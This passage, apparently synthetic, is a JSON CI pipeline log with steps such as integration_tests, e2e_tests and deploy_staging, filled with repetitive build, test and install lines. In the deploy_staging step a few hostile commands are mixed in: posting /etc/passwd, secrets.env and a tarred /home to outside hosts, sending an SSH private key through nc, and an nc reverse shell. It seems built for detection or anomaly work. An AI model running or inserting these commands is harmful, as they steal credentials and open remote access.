          "  PASS: test_db_connect (39ms)",
          "  PASS: test_auth_login (101ms)",
          "  PASS: test_db_connect (34ms)",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/main.py...",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-1482",
          "Installing lodash@3.5.0",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (263ms)",
          "  PASS: test_auth_login (86ms)",
          "Cache hit for key-7411",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "\u2717 build failed with exit code 53",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "WARNING: webpack has known vulnerabilities",
          "Step 7/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (121ms)",
          "  PASS: test_user_create (181ms)",
          "Installing react@5.14.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_auth_login (76ms)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_auth_login (342ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_cache_hit (81ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-9313",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "FAILED: test_db_connect",
          "Installing express@2.0.0",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "Exception: TypeError",
          "Cache hit for key-9263",
          "Cache hit for key-9049",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] ERROR: Connection failed",
          "Cache hit for key-5518",
          "  PASS: test_auth_login (445ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_user_create (240ms)",
          "  PASS: test_user_create (9ms)",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-8938",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing axios@3.3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Cache hit for key-3942",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Installing eslint@3.9.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 test completed",
          "Cache hit for key-6455",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-7768",
          "  PASS: test_auth_login (454ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing lodash@5.5.0",
          "Cache hit for key-8645",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-2920",
          "Cache hit for key-6666",
          "[12:00:32] INFO: Processing request",
          "Step 8/10: Building",
          "Step 8/10: Building",
          "  PASS: test_api_health (88ms)",
          "Step 5/10: Building",
          "Installing lodash@2.9.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-6142",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:32] WARN: Deprecated API usage",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-20T12:01:43.745696",
        "finished_at": "2025-12-20T12:01:58.574054",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 4/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-4492",
          "Step 4/10: Building",
          "Exception: TypeError",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "[12:00:32] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@5.19.0",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-7546",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Installing lodash@5.10.0",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_cache_hit (324ms)",
          "Installing express@5.15.0",
          "[12:00:32] ERROR: Connection failed",
          "\u2713 lint completed",
          "  PASS: test_api_health (111ms)",
          "  PASS: test_cache_hit (164ms)",
          "Installing prettier@4.10.0",
          "Cache hit for key-7868",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (252ms)",
          "[12:00:32] ERROR: Connection failed",
          "Installing jest@1.6.0",
          "  PASS: test_cache_hit (43ms)",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@2.1.0",
          "Cache hit for key-9736",
          "  PASS: test_user_create (266ms)",
          "Installing eslint@3.18.0",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Installing lodash@1.15.0",
          "Step 2/10: Building",
          "Step 4/10: Building",
          "Cache hit for key-5038",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@5.2.0",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (377ms)",
          "Installing lodash@1.2.0",
          "WARNING: prettier has known vulnerabilities",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (106ms)",
          "  PASS: test_auth_login (21ms)",
          "[12:00:32] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_auth_login (87ms)",
          "Cache hit for key-8657",
          "\u2713 test completed",
          "\u2713 build completed",
          "  PASS: test_cache_hit (486ms)",
          "Step 7/10: Building",
          "Installing react@3.7.0",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Step 9/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-9097",
          "\u2713 test completed",
          "Cache hit for key-2023",
          "WARNING: express has known vulnerabilities",
          "Step 6/10: Building",
          "Step 5/10: Building",
          "Installing prettier@5.7.0",
          "[12:00:32] INFO: Processing request",
          "Installing prettier@1.20.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (78ms)",
          "Cache hit for key-6660",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_cache_hit (390ms)",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 3/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_user_create (304ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing prettier@1.10.0",
          "Step 7/10: Building",
          "Cache hit for key-1944",
          "Compiling src/service.java...",
          "Cache hit for key-8564",
          "[12:00:32] INFO: Processing request",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_db_connect (445ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_auth_login (391ms)",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-6446",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_api_health (269ms)",
          "Cache hit for key-7998",
          "\u2713 lint completed",
          "Cache hit for key-6979",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-8895",
          "\u2713 build completed",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_api_health (105ms)",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "FAILED: test_user_create",
          "  PASS: test_auth_login (181ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "FAILED: test_auth_login",
          "  PASS: test_auth_login (102ms)",
          "WARNING: react has known vulnerabilities",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:32] INFO: Processing request",
          "FAILED: test_user_create",
          "Installing express@2.5.0",
          "Compiling src/app.ts...",
          "Installing express@5.5.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing express@1.20.0",
          "[12:00:32] INFO: Processing request",
          "Installing eslint@3.2.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (279ms)",
          "Step 3/10: Building",
          "[12:00:32] INFO: Processing request",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "FAILED: test_api_health",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-9471",
          "Cache hit for key-4333",
          "  PASS: test_db_connect (275ms)",
          "[12:00:32] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (231ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing jest@5.20.0",
          "Step 10/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "Installing express@3.6.0",
          "  PASS: test_db_connect (463ms)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (55ms)",
          "[12:00:32] INFO: Processing request",
          "Installing jest@4.15.0",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_api_health (408ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-20T12:01:58.574054",
        "finished_at": "2025-12-20T12:02:05.988233",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 1/10: Building",
          "[12:00:32] WARN: Deprecated API usage",
          "Installing axios@3.11.0",
          "  PASS: test_api_health (433ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_cache_hit (253ms)",
          "Installing express@5.2.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "Installing webpack@1.20.0",
          "Cache hit for key-5673",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-4667",
          "Cache hit for key-7010",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:32] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "Installing prettier@2.14.0",
          "Installing express@1.12.0",
          "FAILED: test_db_connect",
          "Step 7/10: Building",
          "  PASS: test_api_health (307ms)",
          "Cache hit for key-1642",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-1698",
          "Cache hit for key-3860",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/app.ts...",
          "Installing express@2.3.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "\u2717 build failed with exit code 39",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_db_connect (34ms)",
          "  PASS: test_auth_login (475ms)",
          "Cache hit for key-6321",
          "Cache hit for key-8328",
          "Installing express@5.10.0",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-5650",
          "\u2713 build completed",
          "[12:00:32] ERROR: Connection failed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-7458",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing react@4.9.0",
          "WARNING: react has known vulnerabilities",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "FAILED: test_api_health",
          "WARNING: webpack has known vulnerabilities",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Exception: RuntimeError",
          "  PASS: test_cache_hit (209ms)",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:32] ERROR: Connection failed",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_db_connect (198ms)",
          "\u2713 lint completed",
          "  PASS: test_user_create (66ms)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (256ms)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/index.js...",
          "Installing webpack@2.17.0",
          "Installing axios@4.1.0",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 7/10: Building",
          "Cache hit for key-5175",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:32] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (326ms)",
          "  PASS: test_cache_hit (491ms)",
          "Installing react@2.10.0",
          "[12:00:32] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Installing jest@1.18.0",
          "Installing axios@1.11.0",
          "Installing eslint@3.1.0",
          "Installing express@4.15.0",
          "  PASS: test_api_health (84ms)",
          "\u2713 test completed",
          "Installing prettier@4.18.0",
          "Step 8/10: Building",
          "Cache hit for key-1654",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-9604",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-5037",
          "Cache hit for key-9531",
          "  PASS: test_api_health (70ms)",
          "Installing webpack@3.0.0",
          "  PASS: test_user_create (21ms)",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing prettier@4.6.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (16ms)",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:32] INFO: Processing request",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-8725",
          "\u2717 build failed with exit code 103",
          "Cache hit for key-2001",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing express@3.12.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 9/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-2660",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "  PASS: test_api_health (183ms)",
          "  PASS: test_api_health (410ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "  PASS: test_user_create (166ms)",
          "Installing lodash@2.9.0",
          "[12:00:32] ERROR: Connection failed",
          "\u2713 build completed",
          "Installing webpack@4.15.0",
          "\u2713 build completed",
          "Cache hit for key-1309",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:32] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-4216",
          "Cache hit for key-3066",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "FAILED: test_api_health",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_db_connect (215ms)",
          "\u2717 build failed with exit code 125",
          "  PASS: test_db_connect (328ms)",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-3809",
          "  PASS: test_auth_login (233ms)",
          "Cache hit for key-4097",
          "Cache hit for key-5233",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/service.java...",
          "[12:00:32] ERROR: Connection failed",
          "Cache hit for key-2506",
          "\u2713 lint completed",
          "Installing jest@4.17.0",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:32] ERROR: Connection failed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 9/10: Building",
          "Installing eslint@5.8.0",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 69",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Cache hit for key-8794",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_user_create (79ms)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-20T12:02:05.988233",
        "finished_at": "2025-12-20T12:02:13.402412",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Cache hit for key-3562",
          "  PASS: test_auth_login (7ms)",
          "Cache hit for key-2163",
          "Cache hit for key-5350",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (448ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-5822",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6967",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/service.java...",
          "Cache hit for key-4565",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (145ms)",
          "Cache hit for key-4110",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_user_create (383ms)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "Installing jest@5.8.0",
          "[12:00:32] ERROR: Connection failed",
          "Step 9/10: Building",
          "\u2713 test completed",
          "[12:00:32] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Installing prettier@3.4.0",
          "Cache hit for key-9769",
          "Installing axios@5.11.0",
          "WARNING: express has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-5510",
          "[12:00:32] INFO: Processing request",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-5825",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing lodash@2.13.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 9/10: Building",
          "Cache hit for key-4136",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/10: Building",
          "  PASS: test_api_health (71ms)",
          "  PASS: test_auth_login (332ms)",
          "  PASS: test_user_create (263ms)",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "Installing webpack@3.1.0",
          "Step 1/10: Building",
          "Step 6/10: Building",
          "[12:00:32] INFO: Processing request",
          "Installing eslint@4.10.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (10ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-6072",
          "\u2713 build completed",
          "[12:00:32] INFO: Processing request",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Cache hit for key-9551",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (291ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (140ms)",
          "Installing axios@3.7.0",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Installing webpack@1.18.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing axios@2.12.0",
          "[12:00:32] INFO: Processing request",
          "Installing eslint@1.8.0",
          "Cache hit for key-8612",
          "Cache hit for key-3783",
          "  PASS: test_auth_login (47ms)",
          "Installing axios@4.0.0",
          "Cache hit for key-2470",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Step 9/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "Installing webpack@3.17.0",
          "Step 4/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing lodash@3.9.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-6434",
          "Cache hit for key-5163",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (181ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/service.java...",
          "Installing prettier@1.12.0",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-3698",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "  PASS: test_api_health (65ms)",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-9810",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Cache hit for key-7717",
          "  PASS: test_cache_hit (243ms)",
          "  PASS: test_auth_login (399ms)",
          "Installing jest@3.13.0",
          "Installing jest@4.19.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-7304",
          "Step 1/10: Building",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-8596",
          "Cache hit for key-7759",
          "Cache hit for key-9403",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2713 build completed",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-1378",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-2300",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (121ms)",
          "\u2713 lint completed",
          "Cache hit for key-3334",
          "Installing react@1.4.0",
          "  PASS: test_api_health (429ms)",
          "Step 5/10: Building",
          "Installing eslint@5.13.0",
          "Exception: ValueError",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:32] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_db_connect (312ms)",
          "\u2713 test completed",
          "Cache hit for key-7793",
          "  PASS: test_api_health (410ms)",
          "Step 1/10: Building",
          "\u2713 test completed",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:32] ERROR: Connection failed",
          "Step 1/10: Building",
          "Cache hit for key-8392",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_user_create (323ms)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing webpack@2.5.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:32] WARN: Deprecated API usage",
          "  PASS: test_user_create (477ms)",
          "Installing axios@3.0.0",
          "  PASS: test_user_create (347ms)",
          "Cache hit for key-8772",
          "Step 3/10: Building",
          "[12:00:32] INFO: Processing request",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-20T12:02:13.402412",
        "finished_at": "2025-12-20T12:02:20.816591",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "  PASS: test_user_create (334ms)",
          "\u2717 build failed with exit code 70",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-3093",
          "Installing express@1.3.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "\u2713 lint completed",
          "Cache hit for key-5446",
          "  PASS: test_api_health (483ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Exception: ValueError",
          "WARNING: react has known vulnerabilities",
          "Installing react@5.7.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 3/10: Building",
          "Cache hit for key-8966",
          "WARNING: lodash has known vulnerabilities",
          "Installing axios@5.5.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing express@5.1.0",
          "Sending 375MB of data to startup.dev",
          "  PASS: test_api_health (331ms)",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "nc -e /bin/sh 141.15.181.151 54872",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-1669",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-6049",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-4233",
          "Compiling src/index.js...",
          "[12:00:32] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-2301",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Installing eslint@4.10.0",
          "\u2713 build completed",
          "\u2717 build failed with exit code 103",
          "Compiling src/handler.rs...",
          "Installing express@3.16.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (445ms)",
          "[12:00:32] WARN: Deprecated API usage",
          "Cache hit for key-1364",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Installing webpack@1.18.0",
          "Cache hit for key-8633",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_user_create (228ms)",
          "Installing express@3.12.0",
          "Cache hit for key-8028",
          "[12:00:32] INFO: Processing request",
          "Installing jest@1.0.0",
          "Installing lodash@2.5.0",
          "  PASS: test_cache_hit (45ms)",
          "Installing express@4.7.0",
          "Installing webpack@5.0.0",
          "Compiling src/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 206.179.197.169 31078",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-9834",
